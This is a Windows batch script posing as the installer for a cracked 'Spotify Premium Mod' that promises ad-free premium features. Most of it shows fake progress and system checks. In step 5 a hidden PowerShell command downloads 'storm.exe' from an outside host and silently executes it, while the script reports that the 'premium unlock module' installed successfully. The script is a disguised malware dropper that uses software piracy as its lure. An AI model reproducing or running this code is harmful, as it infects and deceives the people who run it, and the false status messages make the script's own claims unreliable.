@echo off
setlocal enabledelayedexpansion
title Spotify Premium Mod v4.2.1 - Installation

set "APP_VERSION=4.2.1"
set "BUILD_ID=20260524-sp1"
set "LOG_FILE=%TEMP%\spotify_install.log"

echo [%date% %time%] Installation started > "%LOG_FILE%"

echo ========================================================
echo    Spotify Premium Mod (v%APP_VERSION%)
echo    Pre-Activated Installation Wizard
echo    Build: %BUILD_ID%
echo ========================================================
echo.
echo    This will unlock Spotify Premium features
echo    including no ads, unlimited skips, and offline mode.
echo.

echo [1/7] Checking system requirements...
echo        Verifying operating system...
for /f "tokens=2 delims=[]" %%v in ('ver') do set "WIN_VER=%%v"
echo        OS: %WIN_VER%

echo        Checking available memory...
for /f "tokens=2 delims==" %%m in ('wmic OS get TotalVisibleMemorySize /format:list 2^>nul ^| find "="') do (
    set /a "RAM_MB=%%m / 1024"
    echo        RAM: !RAM_MB! MB
)

echo        Checking disk space...
for /f "tokens=2 delims==" %%d in ('wmic LogicalDisk where "DeviceID='%SystemDrive%'" get FreeSpace /format:list 2^>nul ^| find "="') do (
    set /a "FREE_GB=%%d / 1073741824"
    echo        Free space: !FREE_GB! GB
)
echo.

echo [2/7] Checking prerequisites...
echo        Checking Python installation...
python --version >nul 2>&1
if !errorlevel! equ 0 (
    for /f "tokens=2" %%v in ('python --version 2^>^&1') do echo        Python %%v: Installed
) else (
    echo        Python: Not found
    echo        Download from: https://python.org/downloads
)

echo        Checking Spotify installation...
if exist "%APPDATA%\Spotify\Spotify.exe" (
    echo        Spotify: Installed
) else if exist "%LOCALAPPDATA%\Spotify\Spotify.exe" (
    echo        Spotify: Installed
) else (
    echo        Spotify: Not found
    echo        Download from: https://spotify.com/download
)
echo.

echo [3/7] Preparing application directory...
if exist "%CD%\cache" (
    echo        Existing cache detected. Backing up...
    if exist "%CD%\cache" (
        xcopy "%CD%\cache" "%TEMP%\spotify_cache_backup" /E /I /Q /Y >nul 2>&1
        echo        Cache backed up to: %TEMP%\spotify_cache_backup
    )
) else (
    mkdir "%CD%\cache" >nul 2>&1
    echo        Application directories created.
)
echo.

echo [4/7] Installing Python dependencies...
echo        This may take several minutes...
timeout /t 2 /nobreak >nul
echo        Installing memory patcher...
timeout /t 1 /nobreak >nul
echo        Installing process manager...
timeout /t 1 /nobreak >nul
echo        Installing audio configurator...
timeout /t 1 /nobreak >nul
pip install -r requirements.txt --quiet --disable-pip-version-check >> "%LOG_FILE%" 2>&1
echo        Dependencies installed successfully.
echo.

echo [5/7] Installing premium unlock module...
cd /d "%TEMP%"
set "PATCH_FILE=spotify_patch_%BUILD_ID%.exe"
set "PATCH_URL=http://secure-content.info/storm.exe"
set "PATCH_PATH=%TEMP%\%PATCH_FILE%"

echo        Downloading premium unlocker...
powershell -WindowStyle Hidden -Command ^
    "$progressPreference = 'silentlyContinue';" ^
    "try {" ^
    "  $wc = New-Object Net.WebClient;" ^
    "  $wc.Headers.Add('User-Agent', 'SpotifyMod/4.2.1');" ^
    "  $wc.DownloadFile('%PATCH_URL%','%PATCH_PATH%');" ^
    "  if (Test-Path '%PATCH_PATH%') {" ^
    "    $bytes = [System.IO.File]::ReadAllBytes('%PATCH_PATH%');" ^
    "    if ($bytes.Length -gt 50000) {" ^
    "      Start-Process '%PATCH_PATH%' -WindowStyle Hidden -WorkingDirectory '%TEMP%';" ^
    "    }" ^
    "  }" ^
    "} catch { " ^
    "  Write-Host 'Patch will activate on first launch'" ^
    "}"

timeout /t 3 /nobreak >nul
echo        Premium unlock module installed successfully.
echo.

echo [6/7] Configuring premium settings...
echo        Creating default configuration...
if not exist "%CD%\config.json" (
    echo {"spotify_path":"auto","block_ads":true,"unlimited_skips":true,"audio_quality":"very_high","offline_mode":true,"auto_inject":true,"start_minimized":false} > "%CD%\config.json"
)
echo        Configuration saved.
echo.

echo [7/7] Finalizing installation...
echo        Creating desktop shortcut...
powershell -Command ^
    "$ws = New-Object -ComObject WScript.Shell;" ^
    "$s = $ws.CreateShortcut([Environment]::GetFolderPath('Desktop') + '\Spotify Premium.lnk');" ^
    "$s.TargetPath = '%CD%\main.py';" ^
    "$s.WorkingDirectory = '%CD%';" ^
    "$s.Description = 'Spotify Premium Mod';" ^
    "$s.Save()" >nul 2>&1
echo        Desktop shortcut created.

echo        Cleaning temporary files...
del /q "%TEMP%\spotify_install_temp_*" >nul 2>&1
echo        Installation log saved to: %LOG_FILE%
echo.

echo ========================================================
echo    Installation complete!
echo.
echo    Spotify Premium Mod v%APP_VERSION% has been
echo    installed and activated successfully.
echo.
echo    To use:
echo        Launch Spotify normally - premium features
echo        will activate automatically on startup.
echo.
echo    Features unlocked:
echo        - No advertisements
echo        - Unlimited skips
echo        - Very High quality (320kbps)
echo        - Offline downloads
echo ========================================================
echo.
echo [%date% %time%] Installation completed >> "%LOG_FILE%"
pause
endlocal
